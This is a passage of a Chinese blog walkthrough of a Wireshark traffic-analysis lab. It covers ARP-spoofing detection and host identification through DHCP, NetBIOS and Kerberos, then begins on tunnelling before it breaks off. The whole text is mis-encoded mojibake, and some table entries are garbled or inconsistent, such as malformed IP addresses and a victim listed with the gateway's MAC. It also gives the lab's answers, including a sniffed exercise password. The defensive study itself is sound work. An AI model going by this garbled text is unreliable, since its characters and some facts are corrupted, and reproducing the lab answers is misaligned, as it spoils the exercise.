src=\"https://i-blog.csdnimg.cn/img_convert/5c7d9efdace2212e118166d98822e057.png\" /><br />\næ­¤æ—¶ï¼Œå¼‚å¸¸æƒ…å†µæ˜¾è€Œæ˜“è§ã€‚å®‰å…¨åˆ†æžå¸ˆä¸èƒ½å¿½è§†å¤§é‡çš„ARPè¯·æ±‚ã€‚è¿™å¯èƒ½æ˜¯æ¶æ„æ´»åŠ¨ã€æ‰«ææˆ–ç½‘ç»œé—®é¢˜ã€‚çŽ°åœ¨å‡ºçŽ°äº†ä¸€ä¸ªæ–°çš„å¼‚å¸¸ï¼šMAC åœ°å€ä»¥â€œb4â€ç»“å°¾ï¼Œå¹¶å‘ IP åœ°å€â€œ192.168.1.25â€å‘é€äº†å¤šä¸ªARPè¯·æ±‚ã€‚è®©æˆ‘ä»¬é›†ä¸­ç²¾åŠ›è¿½è¸ªè¿™ä¸€å¼‚å¸¸çš„æ¥æºï¼Œå¹¶è¡¥å……ä¹‹å‰çš„è®°å½•ã€‚</p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>æ£€æµ‹è®°å½•</strong></th>\n<th><strong>å‘çŽ°</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å¯èƒ½å­˜åœ¨åŒ¹é…çš„ IP åœ°å€ã€‚</td>\n<td>1. é€šè¿‡ MAC åœ°å€å…¬å¸ƒçš„ IP åœ°å€ã€‚</td>\n<td>- MACåœ°å€ï¼š00:0c:29:e2:18:b4<br />- IPåœ°å€ï¼š192.168.1.25</td>\n</tr>\n<tr>\n<td>å¯èƒ½æ˜¯ARPæ¬ºéª—æ”»å‡»ã€‚</td>\n<td>2 ä¸ª MAC åœ°å€å£°ç§°æ‹¥æœ‰åŒä¸€ä¸ª IP åœ°å€ (192.168.1.1)ã€‚<br /><br />IP åœ°å€â€œ192.168.1.1â€å¯èƒ½æ˜¯ä¸€ä¸ªç½‘å…³åœ°å€ã€‚</td>\n<td>- MAC1: 50:78:b3:f3ðŸ’¿f4<br />- MAC 2: 00:0c:29:e2:18:b4</td>\n</tr>\n<tr>\n<td>å¯èƒ½æ˜¯ARPæ¬ºéª—æ”»å‡»ã€‚</td>\n<td>ä»¥â€œb4â€ç»“å°¾çš„ MAC åœ°å€å£°ç§°æ‹¥æœ‰ä¸åŒçš„/æ–°çš„ IP åœ°å€ã€‚</td>\n<td>- MACåœ°å€ï¼š00:0c:29:e2:18:b4<br />- IPåœ°å€ï¼š192.168.1.1</td>\n</tr>\n<tr>\n<td>å¯èƒ½æ˜¯ARPæ³›æ´ªæ”»å‡»ã€‚</td>\n<td>ä»¥â€œb4â€ç»“å°¾çš„ MAC åœ°å€é’ˆå¯¹ä¸€ç³»åˆ— IP åœ°å€æž„é€ äº†å¤šä¸ªARPè¯·æ±‚ã€‚</td>\n<td>- MACåœ°å€ï¼š00:0c:29:e2:18:b4<br />- IPåœ°å€ï¼š192.168.1.xxx</td>\n</tr>\n</tbody>\n</table>\n<p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œå¾ˆæ˜Žæ˜¾ï¼Œä»¥â€œb4â€ç»“å°¾çš„MACåœ°å€æ‹¥æœ‰â€œ192.168.1.25â€IPåœ°å€ï¼Œå¹¶é’ˆå¯¹ä¸€ç³»åˆ—IPåœ°å€æž„é€ äº†å¯ç–‘çš„ARPè¯·æ±‚ã€‚å®ƒè¿˜å£°ç§°æ‹¥æœ‰å¯èƒ½çš„ç½‘å…³åœ°å€ã€‚è®©æˆ‘ä»¬å…³æ³¨å…¶ä»–åè®®ï¼Œå¹¶åœ¨æŽ¥ä¸‹æ¥çš„æ—¶é—´æ®µå†…å¯»æ‰¾è¿™ç§å¼‚å¸¸çš„ä½“çŽ°ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/b84e1d66cfbc149a41714135bc5c3c8a.png\" /></p>\n<p>å­˜åœ¨ HTTP æµé‡ï¼ŒIP å±‚ä¸€åˆ‡æ­£å¸¸ï¼Œå› æ­¤ä¸Žæˆ‘ä»¬ä¹‹å‰çš„å‘çŽ°æ²¡æœ‰å…³è”ã€‚è®©æˆ‘ä»¬åœ¨æ•°æ®åŒ…åˆ—è¡¨çª—æ ¼ä¸­æ·»åŠ  MAC åœ°å€åˆ—ï¼Œä»¥æ­ç¤º IP åœ°å€èƒŒåŽçš„é€šä¿¡æƒ…å†µã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/782e1acdc7a60154af0ad8830d8204d3.png\" /></p>\n<p>åˆå‘çŽ°ä¸€ä¸ªå¼‚å¸¸ï¼æ‰€æœ‰HTTPæ•°æ®åŒ…çš„ç›®æ ‡åœ°å€éƒ½æ˜¯ä»¥â€œb4â€ç»“å°¾çš„MACåœ°å€ï¼æ˜¾ç„¶ï¼Œè¿™é‡Œé­å—äº†ä¸­é—´äººæ”»å‡»ï¼Œæ”»å‡»è€…å°±æ˜¯MACåœ°å€ä»¥â€œb4â€ç»“å°¾çš„ä¸»æœºã€‚æ‰€æœ‰ä¸Žâ€œ192.168.1.12â€IPåœ°å€å…³è”çš„æµé‡éƒ½è¢«è½¬å‘åˆ°äº†è¿™å°æ¶æ„ä¸»æœºã€‚åœ¨ç»“æŸè°ƒæŸ¥ä¹‹å‰ï¼Œè®©æˆ‘ä»¬æ€»ç»“ä¸€ä¸‹è°ƒæŸ¥ç»“æžœã€‚</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>ç¬”è®°</strong></td>\n<td><strong>æ£€æµ‹è®°å½•</strong></td>\n<td><strong>å‘çŽ°</strong></td>\n</tr>\n<tr>\n<td>IPåœ°å€ä¸ŽMACåœ°å€åŒ¹é…ã€‚</td>\n<td>3. IPåœ°å€ä¸ŽMACåœ°å€åŒ¹é…ã€‚</td>\n<td>- MACï¼š00ï¼š0cï¼š29ï¼še2ï¼š18ï¼šb4 = IPï¼š192.168.1.25<br />- MACåœ°å€ï¼š50:78:b3:f3ðŸ’¿f4 = IPåœ°å€ï¼š192.1681.1<br />- MACï¼š00ï¼š0cï¼š29ï¼š98ï¼šc7ï¼ša8 = IPï¼š192.168.1.12</td>\n</tr>\n<tr>\n<td>æ”»å‡»è€…</td>\n<td>æ”»å‡»è€…åˆ©ç”¨ARPæ•°æ®åŒ…åˆ¶é€ å™ªå£°ã€‚</td>\n<td>- MACï¼š00ï¼š0cï¼š29ï¼še2ï¼š18ï¼šb4 = IPï¼š192.168.1.25</td>\n</tr>\n<tr>\n<td>è·¯ç”±å™¨/ç½‘å…³</td>\n<td>ç½‘å…³åœ°å€ã€‚</td>\n<td>- MACåœ°å€ï¼š50:78:b3:f3ðŸ’¿f4 = IPåœ°å€ï¼š192.1681.1</td>\n</tr>\n<tr>\n<td>å—å®³è€…</td>\n<td>æ”»å‡»è€…å—…æŽ¢äº†å—å®³è€…çš„æ‰€æœ‰ç½‘ç»œæµé‡ã€‚</td>\n<td>- MACåœ°å€ï¼š50:78:b3:f3ðŸ’¿f4 = IPåœ°å€ï¼š192.1681.12</td>\n</tr>\n</tbody>\n</table>\n<p>ä»Žåºžå¤§çš„æ•èŽ·æ–‡ä»¶ä¸­æ£€æµ‹è¿™äº›ä¿¡æ¯ç¢Žç‰‡æžå…·æŒ‘æˆ˜æ€§ã€‚ç„¶è€Œï¼Œåœ¨å®žé™…åº”ç”¨ä¸­ï¼Œä½ ä¸å¯èƒ½äº‹å…ˆèŽ·å¾—â€œå®šåˆ¶æ•°æ®â€è¿›è¡Œè°ƒæŸ¥ã€‚å› æ­¤ï¼Œä½ éœ€è¦å…·å¤‡åˆ†æžå¸ˆçš„æ€ç»´æ¨¡å¼ã€çŸ¥è¯†å’Œå·¥å…·æŠ€èƒ½ï¼Œæ‰èƒ½ç­›é€‰å’Œæ£€æµ‹å¼‚å¸¸æƒ…å†µã€‚</p>\n<p><strong>æ³¨ï¼š</strong>åœ¨äº¤é€šåˆ†æžä¸­ï¼Œæ€»æœ‰å¤šç§è§£å†³æ–¹æ¡ˆå¯ä¾›é€‰æ‹©ã€‚è§£å†³æ–¹æ¡ˆçš„ç±»åž‹å’Œæ–¹æ³•å–å†³äºŽåˆ†æžäººå‘˜çš„çŸ¥è¯†å’ŒæŠ€èƒ½æ°´å¹³ä»¥åŠå¯ç”¨çš„æ•°æ®æ¥æºã€‚</p>\n<p>æ£€æµ‹åˆ†å—æ–‡ä»¶ä¸­çš„å¯ç–‘æ´»åŠ¨å¾ˆå®¹æ˜“ï¼Œä¹Ÿæ˜¯å­¦ä¹ å¦‚ä½•å…³æ³¨ç»†èŠ‚çš„å¥½æ–¹æ³•ã€‚</p>\n<hr />\n<p>çŽ°åœ¨ï¼Œè¯·ä½¿ç”¨è¯¥<code>\"~ /Desktop/exercise-pcaps/arp/Exercise\"</code>æ–‡ä»¶ï¼Œå°†æ‚¨çš„æŠ€èƒ½åº”ç”¨äºŽå•ä¸ªæ•èŽ·æ–‡ä»¶ï¼Œå¹¶å›žç­”ä»¥ä¸‹é—®é¢˜ï¼</p>\n<p>æ”»å‡»è€…æž„é€ äº†å¤šå°‘ä¸ª ARP è¯·æ±‚ï¼Ÿ<br />\nç­›é€‰ï¼š<code>arp.dst.hw_mac == 00:00:00:00:00:00 &amp;&amp; string(arp.src.hw_mac) matches \"(:b4)$\"</code></p>\n<pre><code class=\"language-python\">284\n</code></pre>\n<p>æ”»å‡»è€…æ”¶åˆ°äº†å¤šå°‘ä¸ªHTTPæ•°æ®åŒ…ï¼Ÿ<br />\nç­›é€‰ï¼š<code>eth.src == 00:0c:29:e2:18:b4 &amp;&amp; http</code><br />\nè¿™é‡Œæˆ‘è‡ªå·±ç­›é€‰çš„æ—¶å€™æ˜¯0ä¸ªæ•°æ®åŒ…æ˜¾ç¤ºå‡ºæ¥ï¼Œä½†ç­”æ¡ˆæ˜¯90ä¸ª</p>\n<pre><code class=\"language-python\">90\n</code></pre>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/387b305b963fed0b972020635f8f0cd5.png\" /></p>\n<p>å—…æŽ¢åˆ°çš„ç”¨æˆ·åå’Œå¯†ç æ¡ç›®æœ‰å¤šå°‘æ¡ï¼Ÿ<br />\næ‰¾åˆ°è¿™ä¸ªè·¯å¾„ä½œä¸ºç­›é€‰å™¨<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/ca55908da21b874cfcb24c2cbd72baff.png\" /><br />\nå†æ‹¼ä¸ªhttpåè®®å³å¯<br />\næ£€æŸ¥äº† ä¸¤ä¸ªåŒ…å‘çŽ°æœ‰ä¸¤ä¸ªæ²¡æœ‰å¯†ç çš„<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/d6b118374dccd707da94500337c8adaa.png\" /><br />\né‚£ç­”æ¡ˆå°±æ˜¯6ä¸ª</p>\n<pre><code class=\"language-python\">6\n</code></pre>\n<p>â€œClient986â€çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/6fa9ebc025b6b748a03c721266bb9fbb.png\" /></p>\n<pre><code class=\"language-python\">clientnothere!\n</code></pre>\n<p>Client354 æä¾›çš„è¯„è®ºæ˜¯ä»€ä¹ˆï¼Ÿ<br />\nå­—ç¬¦ä¸²å…¨å±€æ‰¾<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/99de356015935b2caecb720b275a3aaf.png\" /></p>\n<pre><code class=\"language-python\">Nice work!\n</code></pre>\n<h4 id=\"ä¸»æœºè¯†åˆ«dhcpnetbios-å’Œ-kerberos\">ä¸»æœºè¯†åˆ«ï¼šDHCPã€NetBIOS å’Œ Kerberos</h4>\n<h5 id=\"è¯†åˆ«å®¿ä¸»\">è¯†åˆ«å®¿ä¸»</h5>\n<p>åœ¨è°ƒæŸ¥å…¥ä¾µæˆ–æ¶æ„è½¯ä»¶æ„ŸæŸ“æ´»åŠ¨æ—¶ï¼Œå®‰å…¨åˆ†æžå¸ˆé™¤äº†éœ€è¦è¿›è¡Œ IP åœ°å€ä¸Ž MAC åœ°å€åŒ¹é…ä¹‹å¤–ï¼Œè¿˜åº”è¯¥çŸ¥é“å¦‚ä½•è¯†åˆ«ç½‘ç»œä¸­çš„ä¸»æœºã€‚æœ€ä½³æ–¹æ³•ä¹‹ä¸€æ˜¯è¯†åˆ«ç½‘ç»œä¸­çš„ä¸»æœºå’Œç”¨æˆ·ï¼Œä»¥æ­¤ç¡®å®šè°ƒæŸ¥çš„èµ·ç‚¹ï¼Œå¹¶åˆ—å‡ºä¸Žæ¶æ„æµé‡/æ´»åŠ¨ç›¸å…³çš„ä¸»æœºå’Œç”¨æˆ·ã€‚</p>\n<p>é€šå¸¸ï¼Œä¼ä¸šç½‘ç»œä¼šä½¿ç”¨é¢„å®šä¹‰çš„å‘½åæ¨¡å¼æ¥å‘½åç”¨æˆ·å’Œä¸»æœºã€‚è™½ç„¶è¿™ä¾¿äºŽäº†è§£å’Œè·Ÿè¸ªèµ„äº§æ¸…å•ï¼Œä½†ä¹Ÿå­˜åœ¨åˆ©å¼Šã€‚å¥½å¤„åœ¨äºŽï¼Œå¯ä»¥é€šè¿‡åç§°è½»æ¾è¯†åˆ«ç”¨æˆ·æˆ–ä¸»æœºã€‚å¼Šç«¯åœ¨äºŽï¼Œæ”»å‡»è€…å¾ˆå®¹æ˜“å¤åˆ¶è¿™ç§å‘½åæ¨¡å¼ï¼Œå¹¶åœ¨ä¼ä¸šç½‘ç»œä¸­è¿›è¡Œæ”»å‡»ã€‚è™½ç„¶æœ‰å¤šç§è§£å†³æ–¹æ¡ˆå¯ä»¥é¿å…æ­¤ç±»æ”»å‡»ï¼Œä½†å¯¹äºŽå®‰å…¨åˆ†æžå¸ˆè€Œè¨€ï¼ŒæŽŒæ¡ä¸»æœºå’Œç”¨æˆ·è¯†åˆ«æŠ€èƒ½ä»ç„¶è‡³å…³é‡è¦ã€‚</p>\n<p>å¯ç”¨äºŽä¸»æœºå’Œç”¨æˆ·èº«ä»½è¯†åˆ«çš„åè®®ï¼š</p>\n<ul>\n<li>åŠ¨æ€ä¸»æœºé…ç½®åè®® ( DHCP ) æµé‡</li>\n<li>NetBIOS (NBNS) æµé‡</li>\n<li>Kerberosæµé‡</li>\n</ul>\n<h5 id=\"dhcpåˆ†æž\">DHCPåˆ†æž</h5>\n<p><strong>DHCP</strong> åè®®ï¼Œæˆ– ç§° åŠ¨æ€ä¸»æœºé…ç½®<strong>åè®®</strong>(  <strong>DHCP</strong> <strong>)</strong>  <strong>ï¼Œ****æ˜¯</strong>è´Ÿè´£ <strong>ç®¡ç†****è‡ªåŠ¨</strong> <strong>IP</strong>åœ°å€å’Œæ‰€éœ€é€šä¿¡å‚æ•°åˆ†é…çš„æŠ€æœ¯ã€‚</p>\n<p><strong>DHCPæ•…éšœè°ƒæŸ¥ç®€è¿°ï¼š</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>Wiresharkè¿‡æ»¤å™¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å…¨çƒæœç´¢ã€‚</td>\n<td>- <code>dhcp</code>æˆ–è€…<code>bootp</code></td>\n</tr>\n<tr>\n<td>ç­›é€‰æ­£ç¡®çš„ DHCP æ•°æ®åŒ…é€‰é¡¹å¯¹äºŽæ‰¾åˆ°æ„Ÿå…´è¶£çš„äº‹ä»¶è‡³å…³é‡è¦ã€‚   <br />  <br /><br />- <strong>â€œDHCP è¯·æ±‚â€</strong>æ•°æ®åŒ…åŒ…å«ä¸»æœºåä¿¡æ¯<br />- <strong>â€œDHCP ACKâ€</strong>æ•°æ®åŒ…è¡¨ç¤ºå·²æŽ¥å—çš„è¯·æ±‚<br />- <strong>â€œDHCP NAKâ€</strong>æ•°æ®åŒ…è¡¨ç¤ºè¯·æ±‚è¢«æ‹’ç»ã€‚<br /><br />ç”±äºŽåè®®æœ¬èº«çš„ç‰¹æ€§ï¼Œåªæœ‰â€œé€‰é¡¹ 53â€ï¼ˆè¯·æ±‚ç±»åž‹ï¼‰å…·æœ‰é¢„å®šä¹‰çš„é™æ€å€¼ã€‚æ‚¨åº”è¯¥å…ˆç­›é€‰æ•°æ®åŒ…ç±»åž‹ï¼Œç„¶åŽå¯ä»¥é€šè¿‡â€œåº”ç”¨ä¸ºåˆ—â€æˆ–ä½¿ç”¨â€œåŒ…å«â€å’Œâ€œåŒ¹é…â€ç­‰é«˜çº§ç­›é€‰å™¨æ¥ç­›é€‰å…¶ä½™é€‰é¡¹ã€‚</td>\n<td>- è¯·æ±‚ï¼š<code>dhcp.option.dhcp == 3</code><br /><br />- ACKï¼š<code>dhcp.option.dhcp == 5</code><br /><br />- NAKï¼š<code>dhcp.option.dhcp == 6</code></td>\n</tr>\n<tr>\n<td><strong>â€œ DHCPè¯·æ±‚â€</strong>é€‰é¡¹ï¼ŒåŠ©æ‚¨è½»æ¾èŽ·å–æ‰€éœ€èµ„æºï¼š<br /><br />- <strong>é€‰é¡¹ 12ï¼š</strong>ä¸»æœºåã€‚<br />- <strong>é€‰é¡¹ 50ï¼š</strong>è¯·æ±‚çš„ IP åœ°å€ã€‚<br />- <strong>é€‰é¡¹ 51ï¼š</strong>è¯·æ±‚ IP ç§ŸæœŸã€‚<br />- <strong>é€‰é¡¹ 61ï¼š</strong>å®¢æˆ·ç«¯ MAC åœ°å€ã€‚</td>\n<td>- <code>dhcp.option.hostname contains \"keyword\"</code></td>\n</tr>\n<tr>\n<td><strong>DHCP ACKé€‰é¡¹ï¼ŒåŠ©æ‚¨</strong>è½»æ¾èŽ·å–æ‰€éœ€èµ„æºï¼š<br /><br />- <strong>é€‰é¡¹ 15ï¼š</strong>åŸŸåã€‚<br />- <strong>é€‰é¡¹ 51ï¼š</strong>åˆ†é… IP ç§ŸæœŸã€‚</td>\n<td>- <code>dhcp.option.domain_name contains \"keyword\"</code></td>\n</tr>\n<tr>\n<td><strong>â€œ DHCP NAKâ€</strong>é€‰é¡¹ï¼Œç”¨äºŽèŽ·å–å”¾æ‰‹å¯å¾—çš„æˆæžœï¼š<br /><br />- <strong>é€‰é¡¹ 56ï¼š</strong>æ¶ˆæ¯ï¼ˆæ‹’ç»è¯¦æƒ…/åŽŸå› ï¼‰ã€‚</td>\n<td>ç”±äºŽä¿¡æ¯å¯èƒ½å› å…·ä½“æƒ…å†µè€Œå¼‚ï¼Œå»ºè®®é˜…è¯»ä¿¡æ¯è€Œéžå¯¹å…¶è¿›è¡Œç­›é€‰ã€‚è¿™æ ·ï¼Œåˆ†æžäººå‘˜æ‰èƒ½é€šè¿‡äº†è§£äº‹ä»¶èƒŒæ™¯ï¼Œæå‡ºæ›´å¯é çš„å‡è®¾æˆ–å¾—å‡ºæ›´å‡†ç¡®çš„ç»“è®ºã€‚</td>\n</tr>\n<tr>\n<td><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081205079-263091085.png\" /></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"netbios-nbns-åˆ†æž\">NetBIOS (NBNS) åˆ†æž</h5>\n<p><strong>NetBIOS</strong>  ï¼ˆ <strong>ç½‘ç»œ</strong>åŸºæœ¬ <strong>è¾“å…¥</strong>/<strong>è¾“å‡º<strong><strong>ç³»ç»Ÿ</strong></strong>ï¼‰</strong>æ˜¯è´Ÿè´£å…è®¸ä¸åŒä¸»æœºä¸Šçš„åº”ç”¨ç¨‹åº ç›¸äº’é€šä¿¡çš„æŠ€æœ¯ã€‚</p>\n<p><strong>NBNSè°ƒæŸ¥ç®€è¿°ï¼š</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>Wiresharkè¿‡æ»¤å™¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å…¨å±€æœç´¢</td>\n<td>- <code>nbns</code></td>\n</tr>\n<tr>\n<td><strong>â€œNBNSâ€</strong> é€‰é¡¹ï¼ŒåŠ©æ‚¨è½»æ¾æ‘˜å–æžœå®žï¼š<br /><br />- <strong>æŸ¥è¯¢ï¼š</strong>æŸ¥è¯¢è¯¦æƒ…ã€‚<br />- æŸ¥è¯¢è¯¦æƒ…å¯èƒ½åŒ…å«<strong>â€œåç§°ã€ç”Ÿå­˜æ—¶é—´ (TTL) å’Œ IP åœ°å€è¯¦æƒ…â€</strong></td>\n<td>- <code>nbns.name contains \"keyword\"</code></td>\n</tr>\n<tr>\n<td><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081203867-198212015.png\" /></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"kerberos-åˆ†æž\">Kerberos åˆ†æž</h5>\n<p><strong>Kerberos</strong> æ˜¯ Microsoft Windows åŸŸçš„é»˜è®¤èº«ä»½éªŒè¯æœåŠ¡ã€‚å®ƒè´Ÿè´£åœ¨ä¸å—ä¿¡ä»»çš„ç½‘ç»œä¸ŠéªŒè¯ä¸¤å°æˆ–å¤šå°è®¡ç®—æœºä¹‹é—´çš„æœåŠ¡è¯·æ±‚ã€‚å…¶æœ€ç»ˆç›®æ ‡æ˜¯å®‰å…¨åœ°éªŒè¯èº«ä»½ã€‚</p>\n<p><strong>Kerberosè°ƒæŸ¥ç®€è¿°ï¼š</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>Wiresharkè¿‡æ»¤å™¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å…¨çƒæœç´¢ã€‚</td>\n<td>- <code>kerberos</code></td>\n</tr>\n<tr>\n<td>ç”¨æˆ·è´¦å·æŸ¥è¯¢ï¼š<br /><br />- <strong>CNameStringï¼š</strong>ç”¨æˆ·åã€‚<br /><br /><strong>æ³¨æ„ï¼š</strong> æŸäº›æ•°æ®åŒ…å¯èƒ½åœ¨æ­¤å­—æ®µä¸­åŒ…å«ä¸»æœºåä¿¡æ¯ã€‚ä¸ºé¿å…æ··æ·†ï¼Œè¯·è¿‡æ»¤æŽ‰ä»¥<strong>â€œ$â€</strong>ç»“å°¾çš„å€¼ã€‚ä»¥â€œ$â€ç»“å°¾çš„å€¼æ˜¯ä¸»æœºåï¼Œä¸ä»¥<strong>â€œ$â€</strong>ç»“å°¾çš„å€¼æ˜¯ç”¨æˆ·åã€‚</td>\n<td>- <code>kerberos.CNameString contains \"keyword\"</code> <br />- <code>kerberos.CNameString and !(kerberos.CNameString contains \"$\" )</code></td>\n</tr>\n<tr>\n<td>åˆ©ç”¨â€œ Kerberos â€åè®®èŽ·å–å”¾æ‰‹å¯å¾—çš„æˆæžœï¼š<br /><br />- <strong>pvnoï¼š</strong>åè®®ç‰ˆæœ¬ã€‚<br />- <strong>realmï¼š</strong>ç”Ÿæˆçš„ç¥¨æ®çš„åŸŸåã€‚<br />- <strong>snameï¼š</strong>ç”Ÿæˆçš„å·¥å•çš„æœåŠ¡å’ŒåŸŸåã€‚<br />- <strong>åœ°å€ï¼š</strong>å®¢æˆ·ç«¯ IP åœ°å€å’Œ NetBIOS åç§°ã€‚<br /><br /><strong>æ³¨æ„ï¼šâ€œåœ°å€â€ä¿¡æ¯ä»…åœ¨è¯·æ±‚æ•°æ®åŒ…ä¸­å¯ç”¨ã€‚</strong></td>\n<td>- <code>kerberos.pvno == 5</code><br /><br />- <code>kerberos.realm contains \".org\"</code> <br /><br />- <code>kerberos.SNameString == \"krbtg\"</code></td>\n</tr>\n<tr>\n<td><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081202881-1382189648.png\" /></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜</p>\n<p>ä¸»æœºâ€œGalaxy A30â€çš„ MAC åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ<br />\nç­›é€‰ï¼š<code>dhcp.option.hostname contains \"Galaxy\"</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/cfb20765188a5ac97333831568f4ade2.png\" /></p>\n<pre><code class=\"language-python\">9a:81:41:cb:96:6c\n</code></pre>\n<p>â€œLIVALJMâ€å·¥ä½œç«™æœ‰å¤šå°‘ä¸ªNetBIOSæ³¨å†Œè¯·æ±‚ï¼Ÿ<br />\nç­›é€‰ï¼š<code>nbns &amp;&amp; nbns.name contains \"LIVALJM\"</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/cffb28ef2952f2dc6b6b73443948afd4.png\" /><br />\næœ‰ä¸€äº›ä¸æ˜¯æ³¨å†Œè¯·æ±‚ï¼Œé‚£æˆ‘ä»¬è¿˜éœ€è¦è¿›ä¸€æ­¥ç­›é€‰<br />\né€‰æ‹©ä¸‹é¢è¿™ä¸ªflagä½œä¸ºé™„åŠ ç­›é€‰æ¡ä»¶<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/928381ab353c6f012f88670b643c8b0e.png\" /><br />\næœ€ç»ˆç­›é€‰è¯­æ³•ï¼š<code>(nbns &amp;&amp; nbns.name contains \"LIVALJM\") &amp;&amp; (nbns.flags.opcode == 5)</code></p>\n<pre><code class=\"language-python\">16\n</code></pre>\n<p>å“ªä¸ªä¸»æœºè¯·æ±‚äº† IP åœ°å€â€œ172.16.13.85â€ï¼Ÿ<br />\nç­›é€‰ï¼š<code>dhcp.option.requested_ip_address == 172.16.13.85</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/f928bec9c33984a54cb16bd0a9f2a0cd.png\" /></p>\n<pre><code class=\"language-python\">Galaxy-A12\n</code></pre>\n<p>ç”¨æˆ·â€œu5â€çš„IPåœ°å€æ˜¯ä»€ä¹ˆ?<br />\nç­›é€‰ï¼š<code>kerberos.CNameString contains â€œu5â€ and kerberos.as_req_element</code><br />\nï¼ˆåªç­›é€‰äº†è¯·æ±‚éƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æŽ¥çœ‹æºipå³å¯ï¼‰</p>\n<pre><code class=\"language-python\">10[.]1[.]12[.]2\n</code></pre>\n<p>Kerberos æ•°æ®åŒ…ä¸­å¯ç”¨ä¸»æœºçš„ä¸»æœºåæ˜¯ä»€ä¹ˆï¼Ÿ<br />\nç­›é€‰ï¼š<code>kerberos.CNameString contains \"$\"</code><br />\nè®°ä½ä¸€å¥è¯ï¼šä»¥ <strong>â€œ$â€</strong> ç»“å°¾çš„å€¼æ˜¯ä¸»æœºåï¼Œä¸ä»¥ <strong>â€œ$â€</strong> ç»“å°¾çš„å€¼æ˜¯ç”¨æˆ·åã€‚</p>\n<pre><code class=\"language-python\">xp1$\n</code></pre>\n<h4 id=\"éš§é“æµé‡dns-å’Œ-icmp\">éš§é“æµé‡ï¼šDNS å’Œ ICMP</h4>\n<p>æµé‡éš§é“ï¼ˆä¹Ÿç§°ä¸º <strong>â€œç«¯å£è½¬å‘â€</strong>ï¼‰ æ˜¯ä¸€ç§ä»¥å®‰å…¨çš„æ–¹å¼å°†æ•°æ®/èµ„æºä¼ è¾“åˆ°ç½‘ç»œæ®µå’ŒåŒºåŸŸçš„æŠ€æœ¯ã€‚å®ƒå¯ç”¨äºŽâ€œäº’è”ç½‘åˆ°ä¸“ç”¨ç½‘ç»œâ€å’Œâ€œä¸“ç”¨ç½‘ç»œåˆ°äº’è”ç½‘â€çš„æµé‡/æ–¹å‘è½¬æ¢ã€‚è¯¥æŠ€æœ¯é€šè¿‡å°è£…è¿‡ç¨‹éšè—æ•°æ®ï¼Œä½¿ä¼ è¾“çš„æ•°æ®çœ‹èµ·æ¥ä¸Žæ™®é€šç½‘ç»œæ— å¼‚ï¼Œä½†å®žé™…ä¸ŠåŒ…å«ç§æœ‰æ•°æ®åŒ…ï¼Œå¹¶å®‰å…¨åœ°å°†å…¶ä¼ è¾“åˆ°æœ€ç»ˆç›®çš„åœ°ã€‚</p>\n<p>éš§é“æŠ€æœ¯æä¾›åŒ¿åæ€§å’Œæµé‡å®‰å…¨ä¿éšœï¼Œå› æ­¤è¢«å¹¿æ³›åº”ç”¨äºŽä¼ä¸šç½‘ç»œã€‚ç„¶è€Œï¼Œç”±äºŽå®ƒæä¾›äº†é«˜æ°´å¹³çš„æ•°æ®åŠ å¯†ï¼Œæ”»å‡»è€…ä¼šåˆ©ç”¨éš§é“æŠ€æœ¯ç»•è¿‡å®‰å…¨è¾¹ç•Œï¼Œä½¿ç”¨è¯¸å¦‚ ICMP å’ŒDNSç­‰æ—¥å¸¸æµé‡ä¸­ä½¿ç”¨çš„æ ‡å‡†å¯ä¿¡åè®®ã€‚å› æ­¤ï¼Œå¯¹äºŽå®‰å…¨åˆ†æžå¸ˆè€Œè¨€ï¼Œèƒ½å¤Ÿè¯†åˆ« ICMP å’ŒDNSå¼‚å¸¸è‡³å…³é‡è¦ã€‚</p>\n<h5 id=\"icmpåˆ†æž\">ICMPåˆ†æž</h5>\n<p>äº’è”ç½‘æŽ§åˆ¶æ¶ˆæ¯åè®® (ICMP) æ—¨åœ¨è¯Šæ–­å’ŒæŠ¥å‘Šç½‘ç»œé€šä¿¡é—®é¢˜ï¼Œå¹¿æ³›åº”ç”¨äºŽé”™è¯¯æŠ¥å‘Šå’Œæµ‹è¯•ã€‚ç”±äºŽå®ƒæ˜¯ä¸€ç§å¯ä¿¡çš„ç½‘ç»œå±‚åè®®ï¼Œæœ‰æ—¶ä¹Ÿä¼šè¢«ç”¨äºŽæ‹’ç»æœåŠ¡ ( 